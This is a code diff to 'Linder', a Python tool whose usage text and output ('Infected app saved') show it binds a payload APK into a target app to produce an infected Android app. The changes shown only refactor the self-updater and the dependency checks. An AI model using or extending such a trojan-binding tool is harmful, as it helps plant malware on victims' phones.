@@ -1,4 +1,5 @@
 import os,sys,subprocess,socket
+import shutil,urllib.request
 from xml.dom.minidom import parseString
 from time import sleep
 
@@ -46,35 +47,24 @@ def isOnline():
     return False
 
 def Update():
-	if os.name == 'nt':
-		pass # Will add for windows soon.
-	else:
-		os.system("which curl>>w.txt")
-		if os.path.getsize('w.txt') == 0:
-			err_msg("curl is not installed, please install it")
-			os.system(rm + " w.txt")
-			exit()
+		print_status(YELLOW + 'Checking for updates...')
+		o = open('.ver','r')
+		oo = o.read()
+		o.close()
+		u=urllib.request.urlopen('https://raw.githubusercontent.com/TheSpeedX/Linder/master/.ver').read().decode('utf-8')
+		if oo.split('\n')[0] == u.split('\n')[0]:
+			print_status(YELLOW + 'No updates available')
 		else:
-                        os.system(rm + " w.txt")
-			print_status(YELLOW + 'Checking for updates...')
-			o = open('.ver','r')
-			oo = o.read()
-			o.close()
-			os.system(rm + ' .ver')
-			os.system('curl -s -LO https://github.com/R37r0-Gh057/Linder/raw/master/.ver')
-			u = open('.ver','r').read()
-			if int(oo) == int(u):
-				print_status(YELLOW + 'No updates available')
-			else:
-				print_status(GREEN + "Update available. Updating...(DONT CLOSE!")
-				os.system(rm + ' termux-install.sh main.py README.md CONTRIBUTORS.mf')
-				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/main.py')
-				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/README.md')
-				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/CONTRIBUTORS.md')
-				os.system('wget https://github.com/R37r0-Gh057/Linder/raw/master/termux-install.sh')
-				os.system('chmod +x *')
-				print_status(GREEN + "Update Finished")
-				exit()
+			print_status(GREEN + "Update available. Updating...(DONT CLOSE!) ")
+			files_to_update=['main.py','README.md','CONTRIBUTORS.md','termux-install.sh','.ver']
+			for fn in files_to_update:
+				u=urllib.request.urlopen('https://raw.githubusercontent.com/TheSpeedX/Linder/master/'+fn).read().decode('utf-8')
+				f=open(fn,'w')
+				f.write(u)
+				f.close()
+			print_status(GREEN + "Update Finished....")
+			print_status(BLUE + "Please Restart The Script...")
+			exit()
 def Usage():
 	print(YELLOW + 'python3 %s <payload.apk> <target.apk> <output.apk> \n' % (str(sys.argv[0])))
 	print('\n' + YELLOW + 'pass the ' + BLUE + "--update" + YELLOW + " parameter to update.\n" + WHITE)
@@ -347,7 +337,7 @@ def Bind():
 			exit()
 		else:
 			subprocess.call("apksigner sign --ks release.keystore --ks-pass pass:lmaolmfao %s" % (str(sys.argv[3])),shell=True)
-		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)	
+		print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)
 		subprocess.call(rm + " TempP",shell=True)
 		exit()
 	except (UnicodeDecodeError) as e:
@@ -363,38 +353,24 @@ def Bind():
 # Checking whether APKTOOL & APKSIGNER are installed or not.
 
 def main():
-	which = ''
-	if os.name == 'nt':
-		which = 'where'
-	else:
-		which = 'which'
 	print_status("Checking whether APKTOOL is installed or not...")
-	os.system(which + " apktool>>ap.txt")
-	if os.path.getsize('ap.txt') == 0:
+	if shutil.which('apktool') == None:
 		err_msg("ERROR: " + WHITE + "APKTOOL is not installed or not in path. Exiting.")
-		os.system(rm + " ap.txt")
 		exit()
 	else:
 		print(GREEN + "INSTALLED" + WHITE)
-		os.system(rm + " ap.txt")
 	if Termux_Bool:
-		os.system("which apkmod>>apk.txt")
-		if os.path.getsize('apk.txt') == 0:
-                        os.system("rm apk.txt")
+		if shutil.which('apkmod')==None:
 			err_msg("ERROR: " + WHITE + "Please run " + GREEN + "termux-setup.sh" + WHITE + " to install dependencies.")
 			exit()
 		else:
-                        os.system("rm apk.txt")
 			argscheck()
 	print_status("Checking whether APKSIGNER is installed or not...")
-	os.system(which + " apksigner>>aps.txt")
-	if os.path.getsize('aps.txt') == 0:
+	if shutil.which('apksigner')==None:
 		err_msg("\nERROR: " + WHITE + "APKSIGNER is not installed or not in path. Exiting")
-		os.system(rm + " aps.txt")
 		exit()
 	else:
 		print(GREEN + "INSTALLED" + WHITE)
-		os.system(rm + " aps.txt")
 	print_status(YELLOW + "ALL OK, Checking args...\n\n")
 	argscheck()
 
@@ -432,7 +408,6 @@ print("====================================================\n\n")
 sleep(1)
 
 # Finally:-
-
 if not os.path.isfile("release.keystore"):
 	err_msg("\nERROR: keystore file not found. EXITING...")
 	exit()
